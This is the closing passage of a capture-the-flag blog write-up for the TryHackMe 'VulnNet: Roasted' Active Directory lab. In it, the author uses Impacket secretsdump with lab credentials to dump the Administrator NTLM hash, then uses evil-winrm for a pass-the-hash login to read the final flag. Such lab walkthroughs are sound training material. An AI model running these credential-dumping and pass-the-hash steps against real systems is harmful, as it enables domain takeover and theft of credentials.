VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288
</pre></table></code></div></div><p>So we are domain admin, nice !</p><p>Let use Impacket‚Äôs secretsdump.py to.. you guessed it, dump secrets !</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ secretsdump.py vulnnet-rst/a-whitehat:bNdKVkjv3RR9ht@10.10.150.73
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
</pre></table></code></div></div><p>Use administrator‚Äôs hash to do a pass-the-hash attack</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ evil-winrm -i $ip -u administrator -H c2597747aa5e43022a3a3049a3c3b09d

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
vulnnet-rst\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; more ..\desktop\system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
</pre></table></code></div></div><p>Thanks for reading &lt;3</p><p>h3x</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>tryhackme</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/activedirectory/" class="post-tag no-text-decoration" >activedirectory</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Try Hack Me - VulnNet: Roasted - h3xit's ~&url=https://h3xitsec.github.io/posts/hack-vulnnet-roasted/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Try Hack Me - VulnNet: Roasted - h3xit's ~&u=https://h3xitsec.github.io/posts/hack-vulnnet-roasted/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Try Hack Me - VulnNet: Roasted - h3xit's ~&url=https://h3xitsec.github.io/posts/hack-vulnnet-roasted/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/picoctf-binary/">PicoCTF 2022 - Binary Exploitation</a><li><a href="/posts/picoctf-reverse/">PicoCTF 2022 - Reverse Engineering Challenges</a><li><a href="/posts/picoctf-crypto/">PicoCTF 2022 - Crypto Challenges</a><li><a href="/posts/htb-routerspace/">Hack The Box - RouterSpace</a><li><a href="/posts/polyctf-crypto/">24H@CTF - Crypto</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-devel/"><div class="card-body"> <em class="timeago small" date="2022-01-18 00:00:00 -0500" >Jan 18</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Devel</h3><div class="text-muted small"><p> Challenge description https://app.hackthebox.com/machines/Devel This VM is an easy Windows machine Reconnaissance / Enumeration Port scanning and service identification 1 2 3 4 5 6 7 8 9 10 11...</p></div></div></a></div><div class="card"> <a href="/posts/htb-driver/"><div class="card-body"> <em class="timeago small" date="2022-01-16 00:00:00 -0500" >Jan 16</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Driver</h3><div class="text-muted small"><p> Challenge description https://app.hackthebox.com/machines/Driver This VM is an easy Windows machine Reconnaissance / Enumeration Port scanning and service identification 1 2 3 4 5 6 7 8 9 10 1...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blue/"><div class="card-body"> <em class="timeago small" date="2022-01-17 00:00:00 -0500" >Jan 17</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Blue</h3><div class="text-muted small"><p> Challenge description https://app.hackthebox.com/machines/Blue This VM is an easy Windows machine Reconnaissance / Enumeration Port scanning and service identification 1 2 3 4 5 6 7 8 9 10 11 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/thm-blueprint/" class="btn btn-outline-primary" prompt="Older"><p>Try Hack Me - Blueprint</p></a> <a href="/posts/htb-driver/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Driver</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://github.com/h3xitsec">h3xit</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege escalation</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/enumeration/">enumeration</a> <a class="post-tag" href="/tags/eternalblue/">eternalblue</a> <a class="post-tag" href="/tags/gdb/">gdb</a> <a class="post-tag" href="/tags/radare2/">radare2</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-79SMBN4E7F"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-79SMBN4E7F'); }); </script>
